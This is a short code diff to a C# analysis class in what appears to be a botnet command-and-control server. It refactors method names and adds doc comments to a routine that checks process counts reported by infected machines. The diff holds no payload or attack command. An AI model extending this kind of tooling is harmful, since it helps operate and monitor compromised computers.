@@ -8,15 +8,24 @@ namespace CnC_Server.Analyzes.Processes_Analyzes
     [AnalysisName("NumberOfProcessesLowerThen")]
     public class NumberOfProcessesLowerThen_Analysis : Analysis
     {
-        public void printDescription()
+        /// <summary>
+        /// Print the analysis description (what it does)
+        /// </summary>
+        public void PrintDescription()
         {
             Console.WriteLine("This analysis will analyze current processes data by the received parameter");
         }
 
-        public void run(List<Infected_Machine> bots, double paramToCompare)
+        /// <summary>
+        /// Run the analysis on the received bots and param.
+        /// </summary>
+        /// <param name="bots">The bots list to check the analysis on</param>
+        /// <param name="paramToCompare">The param to do the analysis on</param>
+        public void Run(List<Infected_Machine> bots, double paramToCompare)
         {
             bool botPrinted = false;
 
+            // Go through every bot in the list and do the analysis
             for(int i = 0;i<bots.Count;i++)
             {
                 if (!double.IsNaN(bots[i].GetValueByName("processes"))
